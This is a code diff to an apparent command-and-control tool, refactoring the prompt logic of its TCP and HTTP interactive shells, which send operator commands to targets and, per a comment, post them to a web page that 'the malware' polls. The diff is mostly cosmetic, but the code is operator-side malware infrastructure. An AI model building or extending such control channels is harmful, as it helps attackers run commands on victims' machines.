@@ -19,7 +19,7 @@ from cmd import Cmd
 
 
 from backend.TCPlistener import tcplistener
-
+from alertmessages import messagealert
 
 ListenersDict = {}
 ConnectionsDict = {}
@@ -42,18 +42,12 @@ class interacting(Cmd):
 
 
     def Shell(self):
-        #being in a hile loop the date isn't stuck here
-        Datetime = datetime.datetime.now()
-        Datetime = Datetime.strftime(colored('%d-%b-%Y_%I', "green")+':'+ colored('%M%p', "green"))
-        #try:
+        try:
         print("you are connected to: "+self.TargetIP+" on Port: "+self.TargetPORT)
-        #except:
-            #print("the ip and port of target could not be resolved")
+        except:
+            print("the ip and port of target could not be resolved")
 
-        prompt = Datetime+"_"+self.HOST+":"+str(self.PORT)+">> "
-        prompt = prompt.replace(':', termcolor.colored(':', 'blue'))
-        prompt = prompt.replace('>>', termcolor.colored('>>', 'red'))
-        prompt = prompt.replace(Datetime, termcolor.colored(Datetime, 'green'))
+        prompt = messagealert.interactpromp()
         command = input(prompt)
         #part responsible for command history and autoComplete
         #work only on unix
@@ -84,7 +78,7 @@ class interacting(Cmd):
             end = "Close Connection"
             return end
 
-            #quit interacting shell and go back to main menu
+        #quit interacting shell and go back to main menu
         elif command == "exit":
             return False
         #all command that aren't listed above are sent to the target
@@ -109,15 +103,8 @@ class HTTPinteracting(Cmd):
 
     def Shell(self):
 
-        Datetime = datetime.datetime.now()
-        Datetime = Datetime.strftime(colored('%d-%b-%Y_%I', "green")+':'+ colored('%M%p', "green"))
 
-
-        prompt = Datetime+"_"+self.HOST+":"+str(self.PORT)+">> "
-        prompt = prompt.replace(':', termcolor.colored(':', 'blue'))
-        prompt = prompt.replace('>>', termcolor.colored('>>', 'red'))
-        prompt = prompt.replace('_', termcolor.colored('_', 'yellow'))
-        prompt = prompt.replace(Datetime, termcolor.colored(Datetime, 'green'))
+        prompt = messagealert.interactpromp()
         command = input(prompt)
         #part responsible for command history and autoComplete
         #work only on unix
@@ -149,7 +136,6 @@ class HTTPinteracting(Cmd):
         else:
             #all command not listed above are sent and displayed on the web page
             #of the server the malware will read it and sent a response
-            #try:
             index = open(self.path, 'w')
             index.write(str(datetime.datetime.now())+"||"+command)
             index.close()
